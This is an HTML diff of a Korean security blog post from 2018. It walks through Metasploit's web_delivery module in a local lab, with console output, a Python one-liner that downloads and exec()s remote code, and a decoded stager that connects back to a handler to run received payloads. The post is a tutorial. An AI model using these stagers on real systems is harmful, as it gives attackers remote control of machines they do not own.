@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="color-scheme" content="dark">
+    <meta name="theme-color" content="#040405">
+
+    
+    <title>Metasploit web delivery 모듈을 이용한 Command line에서 meterpreter session 만들기 | HAHWUL</title>
+
+    
+    
+        <meta name="description" content="Offensive Security Engineer, Developer and H4cker.">
+    
+
+    
+    <meta property="og:title" content="Metasploit web delivery 모듈을 이용한 Command line에서 meterpreter session 만들기">
+  <meta property="og:type" content="article">
+  <meta property="og:url" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2018/metasploit-web-delivery-command-line/">
+  <meta property="og:description" content="Offensive Security Engineer, Developer and H4cker.">
+  <meta property="og:image" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/og.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Metasploit web delivery 모듈을 이용한 Command line에서 meterpreter session 만들기">
+  <meta name="twitter:description" content="Offensive Security Engineer, Developer and H4cker.">
+  <meta name="twitter:image" content="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/og.png">
+    <meta property="og:site_name" content="PIXN">
+    <meta property="og:locale" content="en_US">
+
+    
+    <link rel="canonical" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2018/metasploit-web-delivery-command-line/">
+    
+
+    
+    <link rel="alternate" type="application/rss+xml" title="HAHWUL" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/rss.xml">
+    
+
+    
+    <link rel="icon" type="image/png" href="/favicon.svg" sizes="96x96" />
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+    <link rel="shortcut icon" href="/favicon.svg" />
+    <link rel="apple-touch-icon" sizes="180x180" href="/favicon.svg" />
+    <meta name="apple-mobile-web-app-title" content="PIXN" />
+    <link rel="manifest" href="/icons/site.webmanifest" />
+
+    
+    <link rel="preload" as="image" href="/images/pixn-mark.svg">
+
+    
+    <link rel="stylesheet" href="/fonts/pretendard/pretendardvariable-dynamic-subset.css">
+
+    
+    <link rel="stylesheet" href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/assets/main.8885b746.css">
+
+    
+    <link rel="stylesheet" href="/assets/css/highlight/atom-one-dark.min.css?v=f44d507f">
+
+    
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"Article","headline":"Metasploit web delivery 모듈을 이용한 Command line에서 meterpreter session 만들기","url":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2018/metasploit-web-delivery-command-line/","datePublished":"2018-04-14T00:00:00+00:00","dateModified":"2021-07-10T00:00:00+00:00","image":"https://1.bp.blogspot.com/-JtAamhvVmww/WtIFfUcXLXI/AAAAAAAADA0/zbbQqROrf1kBol5s2e5cZd3V74z-xo9dACLcBGAs/s1600/4141.png"}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HAHWUL","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/"},{"@type":"ListItem","position":2,"name":"Archive","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/archive/"},{"@type":"ListItem","position":3,"name":"Blog","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/"},{"@type":"ListItem","position":4,"name":"Untitled","item":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/blog/2018/"},{"@type":"ListItem","position":5,"name":"Metasploit web delivery 모듈을 이용한 Command line에서 meterpreter session 만들기"}]}</script>
+    <script type="application/ld+json">{"@context":"https://schema.org","@type":"WebSite","name":"HAHWUL","url":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/","description":"Offensive Security Engineer, Developer and H4cker.","potentialAction":{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://pixn-analytics-portfolio.forhm0220.chatgpt.site/?q={search_term_string}"},"query-input":"required name=search_term_string"}}</script>
+</head>
+
+<body>
+    <a class="skip-link sr-only" href="#main-content">Skip to content</a>
+    <div class="site-wrapper">
+        <header class="site-header">
+            <div class="header-content">
+                <nav class="main-nav">
+    <div class="nav-logo">
+        <a href="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/" aria-label="PIXN, home">
+            <span class="hw-mark" aria-hidden="true"></span>
+            <span class="nav-wordmark" aria-hidden="true">PIXN</span>
+        </a>
+    </div>
+
+    <button class="nav-toggle" aria-label="Toggle navigation" aria-expanded="false" aria-controls="nav-menu">
+        <span></span>
+        <span></span>
+        <span></span>
+    </button>
+
+    <div class="nav-overlay"></div>
+
+    <div class="nav-menu" id="nav-menu">
+        <a href="/posts/">Posts</a>
+        <a href="/notes/">Notes</a>
+        <a href="/projects/">Projects</a>
+        <a href="/about/">About</a>
+    </div>
+
+    <button class="nav-search" type="button" data-search-trigger aria-label="Open search">
+        <span class="nav-search-key" data-search-key aria-hidden="true">⌘K</span>
+    </button>
+</nav>
+
+<script>
+(function() {
+    const navToggle = document.querySelector('.nav-toggle');
+    const navMenu = document.querySelector('.nav-menu');
+    const navOverlay = document.querySelector('.nav-overlay');
+    const body = document.body;
+
+    function openMenu() {
+        navToggle.setAttribute('aria-expanded', 'true');
+        navToggle.classList.add('active');
+        navMenu.classList.add('active');
+        navOverlay.classList.add('active');
+        body.classList.add('nav-open');
+    }
+
+    function closeMenu() {
+        navToggle.setAttribute('aria-expanded', 'false');
+        navToggle.classList.remove('active');
+        navMenu.classList.remove('active');
+        navOverlay.classList.remove('active');
+        body.classList.remove('nav-open');
+    }
+
+    if (navToggle && navMenu) {
+        navToggle.addEventListener('click', function() {
+            const isExpanded = navToggle.getAttribute('aria-expanded') === 'true';
+            if (isExpanded) {
+                closeMenu();
+            } else {
+                openMenu();
+            }
+        });
+
+        // Close menu when clicking overlay
+        if (navOverlay) {
+            navOverlay.addEventListener('click', closeMenu);
+        }
+
+        // Close menu when clicking a link
+        navMenu.querySelectorAll('a').forEach(function(link) {
+            link.addEventListener('click', closeMenu);
+        });
+
+        // Close menu on escape key
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                closeMenu();
+            }
+        });
+    }
+})();
+</script>
+            </div>
+        </header>
+
+        <main id="main-content">
+            <div class="container">
+                
+
+<div class="post-wrapper">
+    <article class="post-content">
+        <header class="page-header">
+            <h1 class="page-title">Metasploit web delivery 모듈을 이용한 Command line에서 meterpreter session 만들기</h1>
+            <div class="post-meta-section">
+                <div class="post-meta">
+                    
+                    <time class="meta-item" datetime="2018-04-14">
+                        APRIL 14, 2018
+                    </time>
+                     
+                </div>
+            </div>
+
+            
+            <p class="page-description">Offensive Security Engineer, Developer and H4cker.</p>
+            
+        </header>
+
+        <div class="post-body"><p>어떤 방법이던 metasploit을 사용하지 않고 쉘 권한을 얻었을 때 metasploit 과 연결하려면 어떻게 해야할까요? venom으로 만든 페이로드를 실행해서 연결할 수도 있고, 다른 취약점을 발생시키든 여러가지 방법이 있을겁니다.</p>
+<p>오늘은 그러한 방법중에 하나이며, 굉장히 쉽게 세션을 열 수 있는 방법인 web delivery 모듈에 대한 이야기를 하려합니다.</p>
+<h2 id="web-delivery">Web delivery</h2>
+<p>Web delivery는 metasploit에서 간단하게 커맨드 라인으로 Metasploit과 세션연결을 만들어 줄 수 있는 모듈입니다. 만들어진지는 조금 된 모듈이지만, 생각보다 국내에서 소개한 자료는 없는 것 같네요.</p>
+<p>동작 플로우를 살펴보면.. 이런 구조입니다.</p>
+<ul>
+<li>모듈 실행 시 웹 서버가 하나 동작</li>
+<li>해당 웹 페이지로 접근한 사용자는 Delivery 모듈로부터 Metasploit Sessions을 받음</li>
+</ul>
+<p><img loading="lazy" src="https://4.bp.blogspot.com/-qCy8wNWL-dY/WtIFpojm8JI/AAAAAAAADA4/g6ngNo0qaiwzStTxxSEd1mRS-gC5dmE_ACLcBGAs/s1600/2222.png" alt="" /></p>
+<p>Sessions을 받는 과정은 아래에서 한번 더 이야기드리겠지만, Socket connection을 통해 payload 데이터를 받아 바로 메모리상에서 띄웁니다. 아래는 모듈 관련 옵션입니다. Exploit target 부분은 숙지하시면 유용합니다.</p>
+<p>Module options</p>
+<ul>
+<li>SRVHOST: Binding할 호스트입니다.</li>
+<li>SRVPORT: Binding할 포트입니다.</li>
+<li>URIPATH: 쉘을 전달해줄 때 접근해야할 URL 주소</li>
+</ul>
+<p>Exploit Target</p>
+<ul>
+<li>Target 0 : python</li>
+<li>Target 1 : php</li>
+<li>Target 2 : psh</li>
+<li>Target 3 : Regsvr32</li>
+<li>Target 4 : phs(Binary)</li>
+</ul>
+<h2 id="how-to-use">How to use</h2>
+<p>we delivery 모듈을 로드한 후 옵션을 보면 바로 위에서 말씀드린 내용이 있습니다.</p>
+<pre><code>HAHWUL (Sessions: 0 Jobs: 0) use exploit/multi/script/web_delivery
+HAHWUL (Sessions: 0 Jobs: 0) exploit(multi/script/web_delivery) &gt; show options
+
+Module options (exploit/multi/script/web_delivery):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT  3001             yes       The local port to listen on.
+   SSL      false            no        Negotiate SSL for incoming connections
+   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH  /                no        The URI to use for this exploit (default is random)
+
+Payload options (python/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  127.0.0.1        yes       The listen address
+   LPORT  4444             yes       The listen port
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Python
+</code></pre>
+<p>일반적인 Exploit, Auxiliary 모듈과 유사하지만 Exploit target 부분에 Python, powershell 등 쉘 종류가 추가됩니다. 이는 타겟에서 명령어로 실행할 환경에 대한 설정이며 윈도우의 경우 powershell 쪽이 깔끔할 것이고, 나머지는 python이 보편적일 것 같습니다.</p>
+<p>요즘은 워낙 파이썬 라이브러리가 많고 사용되는 곳이 많다보니 기본적으로 python 이 깔려있는 곳도 많습니다. 대표적으로 호스팅서버도 비슷하구요. 각각 옵션들 세팅을 해주시고 실행해보면 아래와 같습니다.</p>
+<pre><code>HAHWUL (Sessions: 0 Jobs: 0) exploit(multi/script/web_delivery) &gt; exploit
+[*] Exploit running as background job 0.
+
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:4444
+</code></pre>
+<pre><code>HAHWUL (Sessions: 0 Jobs: 1) exploit(multi/script/web_delivery) &gt; [*] Using URL: http://0.0.0.0:3001/
+[*] Local IP: http://172.17.0.2:3001/
+[*] Server started.
+[*] Run the following command on the target machine:
+python -c &quot;import sys;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://127.0.0.1:3001/');exec(r.read());&quot;
+[*] 172.17.0.1       web_delivery - Delivering Payload
+</code></pre>
+<p>각 Target에 맞는 Command line 명령을 제공해줍니다. 저는 python 코드입니다.</p>
+<pre><code class="language-bash hljs">python -c <span class="hljs-string">&quot;import sys;u=__import__(&#39;urllib&#39;+{2:&#39;&#39;,3:&#39;.request&#39;}[sys.version_info[0]],fromlist=(&#39;urlopen&#39;,));r=u.urlopen(&#39;http://127.0.0.1:3001/&#39;);exec(r.read());&quot;</span>
+</code></pre>
+<p>타겟 시스템에서 직접 명령어로 코드를 실행해보면 정상적으로 Meterpreter session이 생성됩니다.</p>
+<pre><code class="language-bash hljs">root@a22b7976eb74:/# python -c <span class="hljs-string">&quot;import sys;u=__import__(&#39;urllib&#39;+{2:&#39;&#39;,3:&#39;.request&#39;}[sys.version_info[0]],fromlist=(&#39;urlopen&#39;,));r=u.urlopen(&#39;http://127.0.0.1:3001/&#39;);exec(r.read());&quot;</span>
+</code></pre>
+<pre><code>HAHWUL (Sessions: 0 Jobs: 1) exploit(multi/script/web_delivery) &gt;
+[*] 172.17.0.1       web_delivery - Delivering Payload
+[*] 127.0.0.1        web_delivery - Delivering Payload
+[*] Sending stage (50192 bytes) to 127.0.0.1
+[*] Meterpreter session 1 opened (127.0.0.1:4444 -&gt; 127.0.0.1:39560) at 2018-04-14 22:15:52 +0900
+</code></pre>
+<pre><code>HAHWUL (Sessions: 1 Jobs: 1) exploit(multi/script/web_delivery) &gt; sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type                       Information  Connection
+  --  ----  ----                       -----------  ----------
+  1         meterpreter python/python               127.0.0.1:4444 -&gt; 127.0.0.1:39560 (127.0.0.1)
+</code></pre>
+<h2 id="payload">Payload</h2>
+<p>아래 코드를 타고 쭉 넘어가면 무엇이 있을까 궁금해졌습니다</p>
+<pre><code class="language-bash hljs">python -c <span class="hljs-string">&quot;import sys;u=__import__(&#39;urllib&#39;+{2:&#39;&#39;,3:&#39;.request&#39;}[sys.version_info[0]],fromlist=(&#39;urlopen&#39;,));r=u.urlopen(&#39;http://127.0.0.1:3001/&#39;);exec(r.read());&quot;</span>
+</code></pre>
+<p>urllib 로드해서 web delivery 모듈이 있는 페이지고 접근해서 데이터를 읽어와 실행하는데요, 직접 접근해서 보면 이런 코드가 넘어옵니다.</p>
+<pre><code>HTTP/1.1 200 OK
+Content-Type: application/octet-stream
+Connection: close
+Server: Apache
+Content-Length: 446
+
+import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzEyNy4wLjAuMScsNDQ0NCkpCgkJYnJlYWsKCWV4Y2VwdDoKCQl0aW1lLnNsZWVwKDUpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoZCx7J3MnOnN9KQo=')))
+</code></pre>
+<p>base64를 풀어보면</p>
+<pre><code class="language-python hljs"><span class="hljs-keyword">import</span> <span class="hljs-title class_">socket</span><span class="hljs-operator">,</span><span class="hljs-title class_">struct</span><span class="hljs-operator">,</span><span class="hljs-title class_">time</span>
+<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span><span class="hljs-punctuation">(</span><span class="hljs-number">10</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">:</span>
+    <span class="hljs-keyword">try</span><span class="hljs-punctuation">:</span>
+        s<span class="hljs-operator">=</span>socket<span class="hljs-operator">.</span>socket<span class="hljs-punctuation">(</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>socket<span class="hljs-operator">.</span>SOCK_STREAM<span class="hljs-punctuation">)</span>
+        s<span class="hljs-operator">.</span>connect<span class="hljs-punctuation">(</span><span class="hljs-punctuation">(</span><span class="hljs-string">&#39;</span><span class="hljs-string">127.0.0.1</span><span class="hljs-string">&#39;</span><span class="hljs-punctuation">,</span><span class="hljs-number">4444</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span>
+        <span class="hljs-keyword">break</span>
+    <span class="hljs-keyword">except</span><span class="hljs-punctuation">:</span>
+        time<span class="hljs-operator">.</span>sleep<span class="hljs-punctuation">(</span><span class="hljs-number">5</span><span class="hljs-punctuation">)</span>
+l<span class="hljs-operator">=</span>struct<span class="hljs-operator">.</span>unpack<span class="hljs-punctuation">(</span><span class="hljs-string">&#39;</span><span class="hljs-string">&gt;I</span><span class="hljs-string">&#39;</span><span class="hljs-punctuation">,</span>s<span class="hljs-operator">.</span>recv<span class="hljs-punctuation">(</span><span class="hljs-number">4</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span>
+d<span class="hljs-operator">=</span>s<span class="hljs-operator">.</span>recv<span class="hljs-punctuation">(</span>l<span class="hljs-punctuation">)</span>
+<span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span><span class="hljs-punctuation">(</span>d<span class="hljs-punctuation">)</span><span class="hljs-operator">&lt;</span>l<span class="hljs-punctuation">:</span>
+    d<span class="hljs-operator">+</span><span class="hljs-operator">=</span>s<span class="hljs-operator">.</span>recv<span class="hljs-punctuation">(</span>l<span class="hljs-operator">-</span><span class="hljs-built_in">len</span><span class="hljs-punctuation">(</span>d<span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span>
+exec<span class="hljs-punctuation">(</span>d<span class="hljs-punctuation">,</span><span class="hljs-punctuation">{</span><span class="hljs-string">&#39;</span><span class="hljs-string">s</span><span class="hljs-string">&#39;</span><span class="hljs-punctuation">:</span>s<span class="hljs-punctuation">}</span>
+</code></pre>
+<p>이런식으로 payload handler(4444 포트)로 다시 접근해서 데이터를 받아 명령행으로 넘깁니다.</p>
+</div>
+
+        <div class="footnotes-area"></div>
+
+        
+            
+            
+                
+                
+                
+                
+                
+                
+                
+                
+            
+        
+    </article>
+
+    
+</div>
+
+            </div>
+        </main>
+
+        <footer class="site-footer">
+    <div class="container">
+        <div class="footer-content">
+            <span class="hw-mark footer-mark" aria-hidden="true"></span>
+            <nav class="footer-menu" aria-label="Footer">
+                <a href="/tags/">TAGS</a>
+                <a href="/about/uses/">USES</a>
+                <a href="/contact/">CONTACT</a>
+                <a href="/feeds/">FEEDS</a>
+                <a href="/privacy/">PRIVACY</a>
+            </nav>
+            <div class="socials">
+                <a
+                    href="https://github.com/hahwul"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="GitHub"
+                    aria-label="GitHub"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"
+                        /></svg
+                ></a>
+                <a
+                    href="https://x.com/hahwul"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="X"
+                    aria-label="X (Twitter)"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"
+                        /></svg
+                ></a>
+                <a
+                    href="https://www.instagram.com/hahwul_"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    title="Instagram"
+                    aria-label="Instagram"
+                    ><svg
+                        aria-hidden="true"
+                        fill="currentColor"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 24 24"
+                    >
+                        <path
+                            d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"
+                        /></svg
+                ></a>
+            </div>
+            <p>Developed and Designed by Me<br />2026 HAHWUL.</p>
+        </div>
+    </div>
+</footer>
+        <div
+    class="search-overlay"
+    data-search-overlay
+    data-search-index="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/search_index.json"
+    data-search-empty="Type to search posts, notes, projects and the archive."
+    data-search-no-results="No results found."
+    data-search-loading="Loading index"
+    data-search-error="Unable to load search index. Refresh and try again."
+    aria-hidden="true"
+>
+    <div class="search-panel" role="dialog" aria-modal="true" aria-label="Search">
+        <div class="search-header">
+            <div class="search-input-wrapper">
+                <input
+                    type="search"
+                    name="search"
+                    placeholder="Search the site, #tag to filter"
+                    aria-label="Search the site"
+                    autocomplete="off"
+                    spellcheck="false"
+                    data-search-input
+                >
+            </div>
+            <div class="search-meta">
+                <span class="search-shortcut" data-search-key>⌘K</span>
+                <button class="search-close" type="button" data-search-close aria-label="Close search">
+                    Esc
+                </button>
+            </div>
+        </div>
+        <div class="search-filters" data-search-filters>
+            <div class="search-filter-group" role="group" aria-label="Filter by type" data-filter-group="type">
+                <button type="button" class="search-chip is-active" data-filter-type="all" aria-pressed="true">All<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="post" aria-pressed="false">Posts<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="note" aria-pressed="false">Notes<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="project" aria-pressed="false">Projects<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="archive" aria-pressed="false">Archive<span class="search-chip-count" data-chip-count></span></button>
+                <button type="button" class="search-chip" data-filter-type="page" aria-pressed="false">Pages<span class="search-chip-count" data-chip-count></span></button>
+            </div>
+            <div class="search-filter-group search-filter-group--lang" role="group" aria-label="Filter by language" data-filter-group="lang">
+                <button type="button" class="search-chip is-active" data-filter-lang="all" aria-pressed="true">All</button>
+                <button type="button" class="search-chip" data-filter-lang="en" aria-pressed="false">EN</button>
+                <button type="button" class="search-chip" data-filter-lang="ko" aria-pressed="false">KO</button>
+            </div>
+        </div>
+        <div class="search-status" data-search-status></div>
+        <div class="search-results" data-search-results aria-live="polite">
+            <p class="search-empty" data-search-empty>Type to search posts, notes, projects and the archive.</p>
+        </div>
+    </div>
+</div>
+    </div>
+
+    
+    
+
+    
+    <script src="https://pixn-analytics-portfolio.forhm0220.chatgpt.site/assets/app.1881a2e0.js" defer></script>
+</body>
+
+</html>
